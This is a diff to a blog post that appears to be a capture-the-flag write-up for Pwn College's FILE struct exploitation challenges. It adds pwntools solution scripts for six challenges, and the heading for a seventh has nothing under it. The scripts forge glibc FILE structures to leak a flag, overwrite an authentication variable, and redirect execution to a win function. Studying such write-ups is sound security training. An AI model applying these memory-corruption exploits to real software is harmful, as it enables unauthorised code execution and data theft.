@@ -1,6 +1,6 @@
 ---
 layout: post
-title:  "Pwn College - File Struct Exploits"
+title:  "Pwn College - File Struct Exploitation"
 date:   2024-05-19 19:59:45 +0300
 categories: jekyll update
 ---
@@ -67,7 +67,7 @@ By corrupting the interemediate buffer pointers, the data read from the stream w
 
 Requirements:
 
-1. Adequate `flag` value
+1. Adequate `flags` value for read
 
 2. `read_ptr = read_end`
 
@@ -121,12 +121,149 @@ We can also retrieve the bytes representing this object by calling `bytes(fp)`.
 Moreover, pwntools exports the ability to perform the R/W operations on the stream. For example, by calling `fp.read(target, targetLength)`, a file object with the appropriate values for the underlying pointers would be returned, such that the WRITE primitive would occur on the `target`. Notice `targetLength` must be larger than the amount of bytes requsted by `fread`, as it actually represents the size of the intermediate buffer. 
 
 Another interesting feature of Pwntools is `FileStructure.struntil()` - which generates a `fp` object until certain members. \
-May come handy, incase our primitive is a linear heap overwrite, and we don't like to overwrite other members, such as `_lock`. 
+May come handy, incase our primitive is a linear heap overwrite, and we wouldn't like to overwrite other members, such as `_lock`. 
 
+## Challenge 1
 
+Trivial, set all pointers to `NULL`, except for `read_end`, `write_base` to point to the leak, as well as `write_end` to the amount of bytes to be leaked. 
 
+```python
+p = process(BINARY)
+p.recvuntil(b'is located at ')
+flag_addr = int(p.recvline()[:-1], 16)
+print(f'Flag addr:{flag_addr}')
+p.recvuntil(b'from stdin directly to the FILE struct.\n')
 
+fp = FileStructure()
+fp_bytes = fp.write(flag_addr, 60)
+print(f'fp_bytes:{fp_bytes} len:{len(fp_bytes)}')
 
+p.send(fp_bytes)
+p.recvuntil(b'Here is the contents of the FILE structure.\n')
+p.interactive()
+```
 
+Good to mention - `read()` issued by the program actually reads 480 bytes. We have to verify sequential ordering while sending input to the program. 
+
+## Challenge 2
+
+Notice the underlying call of the challenge (can be found via `strace`):
+
+```bash
+read(3, "FLAG{NOT_HAPPENING}\n", 4096)  = 20                
+```
+
+Hence, we'd need to supply intermediate buffer of at least 0x1000 bytes long - I've chose 0x1100. \
+Moreover, notice that after we'd overwrite the file stream, the program would wait for an input of `0x1000` bytes from `stdin`. Because a flash would occur only in case the whole buffer is filled, I've supplied an input corresponding to the size of the intermediate buffer.  
+
+```python
+p = process(BINARY)
+
+target_addr = binary.symbols['authenticated']
+print(f'Target addr: {target_addr}')
+p.recvuntil(b'from stdin directly to the FILE struct.\n')
+buffer_size = 0x1100
+flags2_offset = 0x74
+
+fp = FileStructure()
+fp.flags = 0xfbad2488
+fp._IO_buf_base = target_addr
+fp._IO_buf_end = target_addr + buffer_size
+fp.fileno = 0
+
+fp_bytes = bytes(fp)[:flags2_offset]
+print(f'fp_bytes:{fp_bytes} len:{len(fp_bytes)}')
+
+p.send(fp_bytes)
+p.recvuntil(b'Here is the contents of the FILE structure.\n')
+p.send(b'A' * buffer_size)
+p.interactive()
+```
+
+## Challenge 3
+
+This challenge is too easy, making it being tricky. \
+Now we can write directly to the `fileno` attribute, not linear heapoverflow from the start of the file stream. \
+Initially, the flag is being read from `"/tmp/babyflag.txt"` via `fread`. Before this `fp` is closed, `fp2` to the exact file is also being opened. \
+We acquire a leak of the value of `fp2->fileno`, which is usually `4`, and therefore `fp->fileno` is usually `3`. We can overwrite only the `fileno` member of the original `fp`, before `fwrite` is being called. 
+
+Hence, if we would overwrite `fp->fileno` to `STDOUT_FILENO = 1`, the `fwrite` call should leak the flag. 
+
+```python
+p = process(BINARY)
+p.send(b'\x01')
+p.interactive()
+```
+
+Pathetic. 
+
+## Challenge 4
+
+Now we'd like to redirect code flow to the `win` function, with a single write primitive. We can do so by writing the GOT entry of `puts` (or `__stack_chk_fail`, if we can corrupt the stack intentionally). \
+Apparently we're given a leak of the return address, but since this is partial RELRO we don't need it.
+
+```python
+p.recvuntil(b'at: ')
+ra_addr = int(p.readline()[:-1], 16)
+
+win_addr = binary.symbols['win']
+target_addr = ra_addr
+print(f'Target addr: {hex(target_addr)}')
+buffer_size = 0x108
+fileno_offset = 0x70
+flags2_offset = 0x74
+
+fp = FileStructure()
+fp.flags = 0xfbad2488
+fp._IO_buf_base = target_addr
+fp._IO_buf_end = target_addr + buffer_size
+fp.fileno = 0
+fp_bytes = bytes(fp)[:flags2_offset]
+print(f'fp_bytes:{fp_bytes} len:{len(fp_bytes)}')
+
+p.send(fp_bytes)
+p.recvuntil(b'Here is the contents of the FILE structure.\n')
+
+stdin_input = struct.pack('<Q', win_addr)
+stdin_input += b'A' * (buffer_size - len(stdin_input))
+p.send(stdin_input)
+p.interactive()
+```
+
+## Challenge 5
+
+We overwrite `stdout`'s file stream. \
+Notice the buffer size can be pretty small, as the libc call that actually being used isn't `fwrite` from some large buffer, but a greeting `puts` call. 
+
+```python
+p = process(BINARY)
+target_addr = binary.symbols['secret']
+buffer_size = 0x50
+fp = FileStructure()
+fp_bytes = fp.write(target_addr, buffer_size)
+p.recvuntil(b'to the FILE struct.\n')
+p.send(fp_bytes)
+p.interactive()
+```
+
+## Challenge 6
+
+```python
+p = process(BINARY)
+target_addr = binary.symbols['authenticated']
+buffer_size = 0x50
+fp = FileStructure()
+fp_bytes = fp.read(target_addr, buffer_size)
+p.recvuntil(b'to the FILE struct.\n')
+p.send(fp_bytes)
+
+p.recvuntil(b'Here is the contents of the FILE structure.\n')
+stdin_input = b''
+stdin_input += b'A' * (buffer_size - len(stdin_input))
+p.send(stdin_input)
+p.interactive()
+```
+
+## Challenge 7
 
 
